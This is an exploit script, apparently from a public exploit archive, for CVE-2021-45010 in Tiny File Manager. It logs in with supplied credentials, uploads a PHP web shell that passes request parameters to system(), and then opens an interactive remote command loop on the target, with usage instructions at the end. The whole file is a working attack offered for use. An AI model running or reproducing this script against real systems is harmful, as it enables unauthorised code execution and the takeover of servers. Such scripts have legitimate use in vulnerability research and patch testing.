#!/usr/bin/python3

'''
  Exploit Title: Tiny File Manager 2.4.6 (Authenticated) Remote Code Execution 
  Date: 04 Mar 2023
  Exploit Author: Syd 
  Software Link: https://github.com/prasathmani/tinyfilemanager
  Version: Tiny File Manager <= 2.4.3 
  Tested on: Ubuntu 20.04
  CVE : CVE-2021-45010
  Reference: https://febin0x4e4a.wordpress.com/2022/01/23/tiny-file-manager-authenticated-rce/
'''

import requests
import sys
import os


Data='''------WebKitFormBoundarycUYlvkDdcbxPEbF5
Content-Disposition: form-data; name="p"

tiny/uploads
------WebKitFormBoundarycUYlvkDdcbxPEbF5
Content-Disposition: form-data; name="fullpath"

shell.php
------WebKitFormBoundarycUYlvkDdcbxPEbF5
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/x-php

<?php

if(isset($_REQUEST['cmd'])){
        echo " ";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo " ";
        die;
}

?>

------WebKitFormBoundarycUYlvkDdcbxPEbF5--
'''

def Get_cookie():
    global Cookie
    init_req=requests.get("{}".format(URL))
    Cookie=init_req.headers["Set-Cookie"].split(":")
    Cookie=(Cookie[0].split(";"))[0]
    print("[+] Got Cookie: ",Cookie)


def Auth_req():
    Headers={
            "Host":"{}".format(Host),
            "Content-Type":"application/x-www-form-urlencoded",
            "Content-Length":"31",
            "Cookie":"{}".format(Cookie),
            "Connection":"close"
            }

    auth_req = requests.post("{}?p=".format(URL),data="fm_usr={}&fm_pwd={}".format(User,Pass),headers=Headers)

    print("[+] Login Successful ",auth_req)

def File_upload():
    Headers = {
            "Host": "{}".format(Host),
            "Cookie":"{}".format(Cookie),
            "Content-Type":"multipart/form-data; boundary=----WebKitFormBoundarycUYlvkDdcbxPEbF5",
            "Content-Length":"551"
            }

    file_upload = requests.post("{}?p={}".format(URL,Path),headers=Headers,data=Data)
    print('[+] Upload Successful')
    cmd_id = requests.get("http://{}{}shell.php?cmd=id".format(Host,Path))
    print("[+] Trying 'id' />",cmd_id.text)
    
def Shell():
    cmd = " "
    print("Simple PHP Shell. Type 'Exit' to quit shell.")
    while cmd != "Exit":
        cmd = str(input("/>"))
        cmd = requests.utils.quote(cmd)
        Response = requests.get("http://{}{}shell.php?cmd={}".format(Host,Path,cmd))
        if "404" in Response.text:
            print('[-] 404 Not Found.\n[-] Shell might have been deleted.')
        else:
            print(Response.text)


if len(sys.argv) == 5:
    URL = sys.argv[1]
    User = requests.utils.quote(sys.argv[2])
    Pass = requests.utils.quote(sys.argv[3])
    Path = sys.argv[4]
    Host = URL.split("/")[2]
    Get_cookie()
    Auth_req()
    File_upload()
    Shell()

else:
    print(" ")
    print(" Tiny File Manager 2.4.6 (Authenticated) Remote Code Execution (CVE-2021-45010) ")
    print(" Date: 04 Mar 2023")
    print(" Exploit Author: Syd")
    print(" ")
    print("     Usage : python3 Exploit.py <Url> <User> <Pass> <Path>")
    print("             Example : python3 Exploit.py http://target/tiny/tinyfilemanager.php admin admin@123 /tiny/uploads")
    print(" ")
